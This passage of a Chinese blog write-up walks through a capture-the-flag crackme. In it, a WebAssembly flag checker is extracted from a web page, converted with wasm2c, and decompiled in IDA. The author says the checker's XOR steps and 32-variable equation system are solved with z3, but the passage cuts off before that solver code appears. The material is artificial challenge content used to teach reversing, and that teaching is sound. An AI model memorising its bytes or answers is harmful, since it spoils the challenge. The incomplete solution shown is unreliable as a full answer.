class="title function_">instantiate</span>(<span class="variable language_">module</span>).<span class="title function_">then</span>(<span class="function"><span class="params">results</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            instance = results;</span></span><br><span class="line"><span class="language-javascript">        &#125;).<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">check_flag</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> value = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;key_value&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (value.<span class="property">length</span> != <span class="number">32</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;tips&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;Not Correct!&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        instance.<span class="property">exports</span>.<span class="title function_">set_input_flag_len</span>(value.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> ii = <span class="number">0</span>; ii &lt; value.<span class="property">length</span>; ii++) &#123;</span></span><br><span class="line"><span class="language-javascript">            instance.<span class="property">exports</span>.<span class="title function_">set_input_flag</span>(value[ii].<span class="title function_">charCodeAt</span>(), ii);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ret = instance.<span class="property">exports</span>.<span class="title function_">check_key</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (ret == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;tips&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;Congratulations!&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;tips&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;Not Correct!&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Key: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;key_value&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:60%&quot;</span> ;=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">                                                                                               <span class="attr">value</span>=<span class="string">&quot;check&quot;</span></span></span><br><span class="line"><span class="tag">                                                                                               <span class="attr">onclick</span>=<span class="string">&quot;check_flag()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;tips&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用一个简单的Javascript脚本将Webassembly抠出来</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;test.wasm&#x27;</span>,<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="string">`</span></span><br><span class="line"><span class="string">00 61 73 6D 01 00 00 00 01 1B 05 60 00 00 60 04</span></span><br><span class="line"><span class="string">7F 7F 7F 7F 01 7F 60 02 7F 7F 01 7F 60 01 7F 01</span></span><br><span class="line"><span class="string">7F 60 00 01 7F 03 0E 0D 00 01 01 01 01 01 01 01</span></span><br><span class="line"><span class="string">01 02 03 04 04 04 05 01 70 01 01 01 05 03 01 00</span></span><br><span class="line"><span class="string">02 06 15 03 7F 01 41 D0 89 04 0B 7F 00 41 D0 89</span></span><br><span class="line"><span class="string">.. .. .. .. .. .. .. .. .. .. .. .. .. .. .. ..</span></span><br><span class="line"><span class="string">6F 6F 05 05 6F 6F 6F 6F 6F 06 06 6F 6F 6F 6F 6F</span></span><br><span class="line"><span class="string">6F 07 07 6F 6F 6F 6F 6F 6F 6F 08 08 6F 6F 6F 6F</span></span><br><span class="line"><span class="string">6F 6F 6F 6F 09 0E 73 65 74 5F 69 6E 70 75 74 5F</span></span><br><span class="line"><span class="string">66 6C 61 67 0A 12 73 65 74 5F 69 6E 70 75 74 5F</span></span><br><span class="line"><span class="string">66 6C 61 67 5F 6C 65 6E 0B 09 63 68 65 63 6B 5F</span></span><br><span class="line"><span class="string">6B 65 79 0C 03 78 78 78</span></span><br><span class="line"><span class="string">`</span>.<span class="title function_">trim</span>().<span class="title function_">split</span>(<span class="regexp">/[\s\r\n]+/g</span>).<span class="title function_">map</span>(<span class="function"><span class="params">str</span> =&gt;</span> <span class="built_in">parseInt</span>(str, <span class="number">16</span>))</span><br><span class="line">))</span><br></pre></td></tr></table></figure>
<p>生成wasm文件，通过wbat中的wasm2c转成wasm.c，但是wasm太晦涩，是栈结构的语言，于是找到头文件用gcc重编译，生成wasm.o，拖入IDA中分析，找到check_key逻辑</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">check_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ST00_4</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ++wasm_rt_call_stack_depth &gt; <span class="number">0x1F4u</span> )</span><br><span class="line">    <span class="built_in">wasm_rt_trap</span>(<span class="number">7LL</span>);</span><br><span class="line">  <span class="built_in">o</span>(<span class="number">0x400u</span>, <span class="number">0x401u</span>, <span class="number">0x402u</span>, <span class="number">0x403u</span>);</span><br><span class="line">  <span class="built_in">oo</span>(<span class="number">0x404u</span>, <span class="number">0x405u</span>, <span class="number">0x406u</span>, <span class="number">0x407u</span>);</span><br><span class="line">  <span class="built_in">ooo</span>(<span class="number">0x408u</span>, <span class="number">0x409u</span>, <span class="number">0x40Au</span>, <span class="number">0x40Bu</span>);</span><br><span class="line">  <span class="built_in">oooo</span>(<span class="number">0x40Cu</span>, <span class="number">0x40Du</span>, <span class="number">0x40Eu</span>, <span class="number">0x40Fu</span>);</span><br><span class="line">  <span class="built_in">ooooo</span>(<span class="number">0x410u</span>, <span class="number">0x411u</span>, <span class="number">0x412u</span>, <span class="number">0x413u</span>);</span><br><span class="line">  <span class="built_in">oooooo</span>(<span class="number">0x414u</span>, <span class="number">0x415u</span>, <span class="number">0x416u</span>, <span class="number">0x417u</span>);</span><br><span class="line">  <span class="built_in">ooooooo</span>(<span class="number">0x418u</span>, <span class="number">0x419u</span>, <span class="number">0x41Au</span>, <span class="number">0x41Bu</span>);</span><br><span class="line">  <span class="built_in">oooooooo</span>(<span class="number">0x41Cu</span>, <span class="number">0x41Du</span>, <span class="number">0x41Eu</span>, <span class="number">0x41Fu</span>);</span><br><span class="line">  v0 = <span class="built_in">xxx</span>();</span><br><span class="line">  --wasm_rt_call_stack_depth;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中o开头均为异或操作，xxx中有一个32元1次方程组，找到对应关系，用z3一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span 